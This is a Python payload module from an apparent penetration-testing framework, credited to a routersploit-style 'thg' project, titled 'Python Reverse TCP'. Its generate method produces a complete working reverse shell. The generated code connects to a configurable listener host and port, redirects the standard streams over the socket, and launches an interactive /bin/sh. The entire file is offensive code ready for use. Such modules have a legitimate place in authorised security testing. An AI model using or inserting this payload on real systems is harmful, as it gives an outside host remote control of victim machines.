from thg.core.exploit.option import OptString
from thg.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)
from thg.modules.encoders.python.base64 import Encoder


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Python Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using python.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # thg module
        ),
    }

    architecture = Architectures.PYTHON
    encoder = OptString(Encoder(), "Encoder")

    def generate(self):
        return (
            "import socket,subprocess,os\n" +
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
            "s.connect(('{}',{}))\n".format(self.lhost, self.lport) +
            "os.dup2(s.fileno(),0)\n" +
            "os.dup2(s.fileno(),1)\n" +
            "os.dup2(s.fileno(),2)\n" +
            "p=subprocess.call([\"/bin/sh\",\"-i\"])"
        )
